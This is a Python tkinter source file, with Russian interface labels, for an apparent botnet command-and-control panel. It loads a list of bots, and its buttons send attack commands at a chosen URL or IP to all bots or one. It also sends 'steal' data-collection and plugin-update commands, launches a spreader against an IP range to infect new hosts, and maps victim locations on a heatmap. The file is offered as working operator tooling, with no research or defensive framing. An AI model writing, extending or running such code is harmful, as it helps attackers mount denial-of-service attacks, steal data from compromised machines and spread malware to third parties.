import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import json, os, threading
import folium, webbrowser
from botnet.c2 import broadcast_command
from engine.attack import AsyncAttackEngine
from utils.logger import log
from utils.widgets import ToolTip

class BotnetTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.bot_data = []
        self.build_ui()
        self.load_bots()

    def build_ui(self):
        nb = ttk.Notebook(self)
        nb.pack(fill=tk.BOTH, expand=True)

        # Вкладка "Список"
        list_frame = ttk.Frame(nb)
        nb.add(list_frame, text="Список")

        control_frame = ttk.Frame(list_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        refresh_btn = ttk.Button(control_frame, text="Обновить", command=self.load_bots)
        refresh_btn.pack(side=tk.LEFT, padx=2)
        ToolTip(refresh_btn, "Считать bots.json заново")
        mass_btn = ttk.Button(control_frame, text="Массовая атака", command=self.mass_attack)
        mass_btn.pack(side=tk.LEFT, padx=2)
        ToolTip(mass_btn, "Отправить команду атаки всем ботам")
        scan_btn = ttk.Button(control_frame, text="Масс-сканер", command=self.mass_scanner)
        scan_btn.pack(side=tk.LEFT, padx=2)
        ToolTip(scan_btn, "Просканировать сеть на уязвимые узлы")

        filter_frame = ttk.Frame(list_frame)
        filter_frame.pack(fill=tk.X, padx=5)
        ttk.Label(filter_frame, text="Фильтр:").pack(side=tk.LEFT)
        self.filter_entry = ttk.Entry(filter_frame, width=30)
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        self.filter_entry.bind("<KeyRelease>", lambda e: self.apply_filter())

        columns = ("ID", "IP", "OS", "Status", "Bandwidth")
        self.tree = ttk.Treeview(list_frame, columns=columns, show="headings")
        for col in columns:
            self.tree.heading(col, text=col, command=lambda c=col: self.sort_by(c))
            self.tree.column(col, width=120)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.tree.bind("<Button-3>", self.show_context_menu)

        # Контекстное меню
        self.context_menu = tk.Menu(self, tearoff=0)
        self.context_menu.add_command(label="Атаковать", command=self.context_attack)
        self.context_menu.add_command(label="Сбор данных", command=self.context_steal)
        self.context_menu.add_command(label="Обновить плагин", command=self.context_update_plugin)

        self.progress = ttk.Progressbar(list_frame, mode="indeterminate")
        self.progress.pack(fill=tk.X, padx=5, pady=2)

        self.status_label = ttk.Label(list_frame, text="Ботов: 0")
        self.status_label.pack(anchor=tk.W, padx=5)

        # Вкладка "Карта"
        map_frame = ttk.Frame(nb)
        nb.add(map_frame, text="Карта")
        heat_btn = ttk.Button(map_frame, text="Показать тепловую карту", command=self.show_heatmap)
        heat_btn.pack(pady=20)
        ToolTip(heat_btn, "Показать ботов на карте (нужны lat/lon в bots.json)")

        # Вкладка "P2P"
        p2p_frame = ttk.Frame(nb)
        nb.add(p2p_frame, text="P2P")
        self.p2p_tree = ttk.Treeview(p2p_frame, columns=("Node ID","IP","Port"), show="headings")
        self.p2p_tree.heading("Node ID", text="Node ID")
        self.p2p_tree.heading("IP", text="IP")
        self.p2p_tree.heading("Port", text="Порт")
        self.p2p_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        p2p_btn_frame = ttk.Frame(p2p_frame)
        p2p_btn_frame.pack()
        ttk.Button(p2p_btn_frame, text="Обновить узлы", command=self.refresh_p2p).pack(side=tk.LEFT, padx=5)
        ttk.Label(p2p_btn_frame, text="Поиск узла:").pack(side=tk.LEFT)
        self.p2p_search_entry = ttk.Entry(p2p_btn_frame, width=20)
        self.p2p_search_entry.pack(side=tk.LEFT, padx=5)
        ttk.Button(p2p_btn_frame, text="Искать", command=self.search_p2p).pack(side=tk.LEFT)

    def load_bots(self):
        if os.path.exists("bots.json"):
            with open("bots.json", "r") as f:
                raw_data = json.load(f)
        else:
            raw_data = []
        self.bot_data = []
        for item in raw_data:
            if isinstance(item, dict):
                bot = item.copy()
            elif isinstance(item, str):
                bot = {"id": item, "ip": "", "os": "", "status": "offline", "bandwidth": 0}
            else:
                continue
            bot.setdefault("id", "unknown")
            bot.setdefault("ip", "")
            bot.setdefault("os", "")
            bot.setdefault("status", "offline")
            bot.setdefault("bandwidth", 0)
            self.bot_data.append(bot)
        self.populate_tree()
        self.status_label.config(text=f"Ботов: {len(self.bot_data)}")

    def populate_tree(self, filtered=None):
        self.tree.delete(*self.tree.get_children())
        data = filtered if filtered is not None else self.bot_data
        for bot in data:
            self.tree.insert("", tk.END, values=(
                bot.get("id", ""),
                bot.get("ip", ""),
                bot.get("os", ""),
                bot.get("status", ""),
                f"{bot.get('bandwidth', 0)} Mbps"
            ))

    def apply_filter(self):
        text = self.filter_entry.get().lower()
        if not text:
            self.populate_tree()
            return
        filtered = [b for b in self.bot_data if text in str(b).lower()]
        self.populate_tree(filtered)

    def sort_by(self, col):
        idx = ["id", "ip", "os", "status", "bandwidth"].index(col.lower())
        self.bot_data.sort(key=lambda b: str(b.get(col.lower(), "")))
        self.populate_tree()

    def show_context_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.context_menu.post(event.x_root, event.y_root)

    def get_selected_bot(self):
        selection = self.tree.selection()
        if selection:
            values = self.tree.item(selection[0], 'values')
            return {'id': values[0], 'ip': values[1], 'os': values[2], 'status': values[3], 'bandwidth': values[4]}
        return None

    def context_attack(self):
        bot = self.get_selected_bot()
        if not bot:
            return
        target = simpledialog.askstring("Атака ботом", f"Цель для {bot['id']}:")
        if target:
            broadcast_command({"action": "attack", "target": target, "bot_id": bot['id']})
            log(f"Отправлена команда атаки боту {bot['id']} на {target}")

    def context_steal(self):
        bot = self.get_selected_bot()
        if bot:
            broadcast_command({"action": "steal", "bot_id": bot['id']})
            log(f"Отправлена команда сбора данных боту {bot['id']}")

    def context_update_plugin(self):
        bot = self.get_selected_bot()
        if bot:
            broadcast_command({"action": "update_plugin", "bot_id": bot['id']})
            log(f"Отправлена команда обновления плагина боту {bot['id']}")

    def mass_attack(self):
        target = simpledialog.askstring("Массовая атака", "Цель (URL/IP):")
        if not target:
            return
        self.progress.start()
        threading.Thread(target=self._do_mass_attack, args=(target,)).start()

    def _do_mass_attack(self, target):
        try:
            log(f"Запуск массовой атаки на {target}")
            broadcast_command({"action": "attack", "target": target})
        finally:
            self.progress.stop()

    def mass_scanner(self):
        ip_range = simpledialog.askstring("Масс-сканер", "IP диапазон (CIDR):")
        if not ip_range:
            return
        log(f"Запущен масс-сканер на {ip_range}")
        threading.Thread(target=self._scan_range, args=(ip_range,)).start()

    def _scan_range(self, ip_range):
        import asyncio
        from botnet.spreader import spread_to_range
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(spread_to_range(ip_range))

    def show_heatmap(self):
        locations = []
        for bot in self.bot_data:
            lat, lon = bot.get("lat"), bot.get("lon")
            if lat and lon:
                locations.append((lat, lon))
        if not locations:
            messagebox.showinfo("Карта", "Нет данных о местоположении ботов. Добавьте поле 'lat'/'lon' в bots.json")
            return
        m = folium.Map(location=[0, 0], zoom_start=2)
        for lat, lon in locations:
            folium.CircleMarker([lat, lon], radius=5, color="red", fill=True).add_to(m)
        m.save("heatmap.html")
        webbrowser.open("heatmap.html")

    # P2P
    def refresh_p2p(self):
        # TODO: запросить узлы из Kademlia
        self.p2p_tree.delete(*self.p2p_tree.get_children())
        try:
            from botnet.kademlia_network import KademliaNode
            # В реальности нужно получить routing_table из узла, но сейчас заглушка
        except:
            pass

    def search_p2p(self):
        key = self.p2p_search_entry.get()
        if not key:
            return
        messagebox.showinfo("P2P Поиск", f"Поиск узла {key}...")
